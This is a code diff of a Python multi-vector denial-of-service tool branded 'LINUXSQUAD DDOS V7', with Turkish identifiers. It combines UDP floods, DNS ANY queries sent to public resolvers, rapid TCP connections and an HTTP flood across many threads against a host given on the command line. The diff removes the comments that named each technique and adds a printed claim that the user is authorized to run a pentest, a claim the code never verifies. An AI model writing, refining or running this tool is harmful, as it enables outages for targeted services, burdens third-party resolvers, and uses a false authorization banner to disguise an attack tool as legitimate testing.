@@ -1,7 +1,13 @@
 #!/data/data/com.termux/files/usr/bin/python
 import socket,random,time,os,sys,threading,struct
 
-print("\033[91m╔══════════════════════════════╗\n║  LİNUXSQUAD DDOS V7   ║\n╚══════════════════════════════╝\033[0m")
+print("\033[91m    ___                                             __")
+print("   / (_)___  __  ___  ___________ ___  ______ _____ / /")
+print("  / / / __ \\/ / / / |/_/ ___/ __ \\ / / / / __ \\/ __  /")
+print(" / / / / / / /_/ />  <(__  ) /_/ / /_/ / /_/ / /_/ /")
+print("/_/_/_/ /_/\\__,_/_/|_/____/\\__, /\\__,_/\\__,_/\\__,_/")
+print("                           /_/\033[0m")
+print("\n\033[94m[+] I have permission and am authorized to perform this pentest\033[0m\n")
 
 if len(sys.argv)<3:
     print("python storm.py <HEDEF> <PORT> [SURE] [THREAD]");sys.exit(1)
@@ -12,7 +18,6 @@ THREAD=min(int(sys.argv[4])if len(sys.argv)>4 else 200,250)
 try:HEDEF=socket.gethostbyname(HEDEF)
 except:pass
 
-# Global DNS resolver listesi - scope sorunu yok
 RESOLVERS=["8.8.8.8","8.8.4.4","1.1.1.1","1.0.0.1","9.9.9.9","208.67.222.222",
 "208.67.220.220","77.88.8.8","94.140.14.14","185.228.168.9","114.114.114.114",
 "223.5.5.5","64.6.64.6","195.46.39.39","213.73.91.35","80.80.80.80",
@@ -25,12 +30,10 @@ class Flooder(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.daemon=True
-        # Her thread kendi UDP socket'ini alir
         self.udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
         self.udp.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
         try:self.udp.bind(("0.0.0.0",random.randint(1024,65535)))
         except:self.udp.bind(("0.0.0.0",0))
-        # DNS amplification paketleri - 3 farkli domain
         self.pkt1=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x03www\x06google\x03com\x00\x00\xff\x00\x01"
         self.pkt2=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x05yahoo\x03com\x00\x00\xff\x00\x01"
         self.pkt3=struct.pack("!HHHHHH",random.randint(0,0xFFFF),0x0100,1,0,0,0)+b"\x08facebook\x03com\x00\x00\xff\x00\x01"
@@ -42,7 +45,6 @@ class Flooder(threading.Thread):
         sayac=0
         while time.time()<bitis:
             try:
-                # Layer 4: UDP DNS Amplification (5 domain x 3 tekrar = 15 paket)
                 for _ in range(3):
                     rs=random.choice(RESOLVERS)
                     self.udp.sendto(self.pkt1,(rs,53))
@@ -52,15 +54,11 @@ class Flooder(threading.Thread):
                     self.udp.sendto(self.pkt5,(rs,53))
                     self.udp.sendto(os.urandom(random.randint(1024,4096)),(HEDEF,PORT))
                     sayac+=6
-                
-                # Layer 4: TCP SYN Flood (hizli connect)
                 tcp=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                 tcp.settimeout(0.01)
                 tcp.connect_ex((HEDEF,PORT))
                 tcp.send(os.urandom(512))
                 tcp.close()
-                
-                # Layer 7: HTTP Flood (port 80/443)
                 if sayac%20==0:
                     for hedef_port in [80,443,8080]:
                         try:
@@ -79,7 +77,6 @@ class Flooder(threading.Thread):
 print(f"\033[93m[+] Hedef:{HEDEF} Port:{PORT} Sure:{SURE}s Thread:{THREAD}\033[0m")
 print("\033[92m[+] Layer4 UDP/TCP + Layer7 HTTP Aktif\033[0m")
 
-# Thread'leri kontrollu baslat - 10'ar 10'ar
 aktif=0
 for i in range(THREAD):
     try:
@@ -88,8 +85,7 @@ for i in range(THREAD):
         aktif+=1
         if i%10==0:
             time.sleep(0.005)
-    except Exception as e:
-        print(f"\033[91m[!] Thread {i} baslatilamadi: {e}\033[0m")
+    except:
         break
 
 print(f"\033[93m[+] {aktif} thread aktif\033[0m")
@@ -98,4 +94,4 @@ try:
     time.sleep(SURE)
     print("\033[92m[+] SALDIRI TAMAMLANDI!\033[0m")
 except KeyboardInterrupt:
-    print("\033[91m[!] KULLANICI TARAFINDAN DURDURULDU\033[0m")
+    print("\033[91m[!] DURDURULDU\033[0m")
